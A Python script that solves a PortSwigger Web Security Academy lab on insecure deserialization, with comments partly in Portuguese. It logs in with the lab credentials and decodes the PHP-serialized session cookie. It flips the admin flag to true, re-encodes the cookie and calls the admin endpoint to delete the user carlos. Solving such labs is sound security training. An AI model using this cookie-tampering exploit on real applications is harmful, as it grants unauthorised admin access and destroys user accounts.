# Batch import libs. I know this is messy behavior but it's for quick prototyping.
import requests
from base64 import b64encode, b64decode, urlsafe_b64encode, urlsafe_b64decode
from time import time
import re
import subprocess
from concurrent.futures import ThreadPoolExecutor
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from http import cookies
import sys


# Lab: Modifying serialized objects
#  This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user carlos.
#You can log in to your own account using the following credentials: wiener:peter 

# Só brainstormando aqui. O script precisa fazer algumas coisas, entre elas: 
# 1. Logar com o peter:wiener
# 2. Exploitar o insecure deserialization pra fazer o peter virar admin
# 3. Deletar a conta do carlos

###################### Meat & Potatoes ######################

BASE_URL = "https://0a3400f30471f886812e434a004100c4.web-security-academy.net/"
session = requests.Session()

def login():
    url = BASE_URL + "/login"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
        "Referer": url,
        "Origin": BASE_URL,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    } ## Set the login headers

    # GET the login page to obtain session cookie ## THIS WAS COMMENTED AS THIS IS NOT NECESSARY IN THIS CASE
   # r_get = session.get(url, headers=headers, allow_redirects=True)
  #  print("GET status:", r_get.status_code)
    # show session cookies obtained automatically
  #  print("cookies:", session.cookies.get_dict())

    # login as wiener
    data = {
        "username": "wiener",
        "password": "peter"
    }

    # ensure Referer set to login page for the POST
    headers["Referer"] = url

    r = session.post(url, data=data, headers=headers, allow_redirects=True)
    print("POST /login status:", r.status_code)

     # quick check for a successful login as peter (adjust based on actual page content)
    if "Log out" in r.text or "Wiener" in r.text:
        print("Likely logged in as Wiener. \nAfter analysis, it can be observed that the session cookie is a serialized object encoded with base64 and URL. It will be parsed, URL-decoded, cleaned and then B64-decoded. \n")
    else:
        print("Login failed or response did not indicate success")


# At this point, it can be observer that the session cookie is a serialized object (URL + b64 encoded)
 
def deserialize():
    # We need to "strip" the session cookie variable of any non-b64 artifacts.
    cookies_dict = session.cookies.get_dict()
    cookie_name = None
    for name in ("session", "sessionid", "connect.sid", "sess", "SID"):
        if name in cookies_dict:
            cookie_name = name
            break
    
    if cookie_name is None:
        cookie_name = list(cookies_dict.keys())[0]

    raw = cookies_dict[cookie_name]

    # URL-decode in case the cookie was percent-encoded
    from urllib.parse import unquote
    raw = unquote(raw)

    # remove common wrappers: signed cookie prefix "s:" and signature suffix after last dot
    if raw.startswith("s:"):
        raw = raw[2:]
    if "." in raw:
        raw = raw.rsplit(".", 1)[0]

    # keep only characters valid for base64 (URL-safe plus standard chars and '=' padding)
    import re
    cleaned = re.sub(r'[^A-Za-z0-9\-\_\=+/]', '', raw)

    # fix padding to a multiple of 4 (base64 requirement)
    pad = (-len(cleaned)) % 4
    cleaned += "=" * pad

    # try URL-safe b64 decode first, fall back to standard b64
    from base64 import urlsafe_b64decode, b64decode
    try:
        decoded = urlsafe_b64decode(cleaned)
    except Exception:
        decoded = b64decode(cleaned)

    try:
        print("decoded text:", decoded.decode('utf-8', errors='replace'))
        decoded_cookie = decoded.decode('utf-8', errors='replace') # store the decoded cookie
    except Exception:
        pass

    print("\nNow, the object will be modified to include Wiener as an administrator.\n") # 
    
    # find and flip admin flag in PHP-serialized string: s:5:"admin";b:0;
    m = re.search(r'(s:\d+:"admin";b:)(0);', decoded_cookie)
    if not m:
        if re.search(r'(s:\d+:"admin";b:)(1);', decoded_cookie):
            print("admin flag already set to 1")
        else:
            print("admin field not found")
        return

    # replace b:0; -> b:1;
    modified_text = decoded_cookie.replace(m.group(0), m.group(1) + "1;")
    print("modified text:", modified_text)

    # re-encode (URL-safe base64, then URL-encode for cookie transport)
    encoded = urlsafe_b64encode(modified_text.encode("utf-8")).decode()
    # keep padding (some libs strip it) — URL-encode to be safe
    new_cookie_value = encoded

     # set the modified cookie in the session (in-memory)
    session.cookies.set(cookie_name, new_cookie_value)
    print(f"Updated session cookie {cookie_name} -> {new_cookie_value}")


# Now, we need to GET this url with the correct cookie to delete the desired user
# https://0a3400f30471f886812e434a004100c4.web-security-academy.net/admin/delete?username=carlos
def deletecarlos():
    url = BASE_URL + "/admin/delete?username=carlos"
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
            "Referer": url,
            "Origin": BASE_URL,
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        } 

    # take the in-memory session cookie and put it into the Cookie header (URL-encode value)
    from urllib.parse import quote
    cookies_dict = session.cookies.get_dict()
    if cookies_dict:
        name, value = next(iter(cookies_dict.items()))
        headers["Cookie"] = f"{name}={quote(value)}"

    r = session.get(url, headers=headers, allow_redirects=True)


def main():
    # Allow BASE_URL to be modified via command line
    global BASE_URL
    if len(sys.argv) > 1:
        BASE_URL = sys.argv[1].rstrip("/") + "/"
    
    # Call the login function
    login()

    # Call the deserialize function
    deserialize()

    # Delete carlos
    deletecarlos()
    


if __name__ == "__main__":
    main()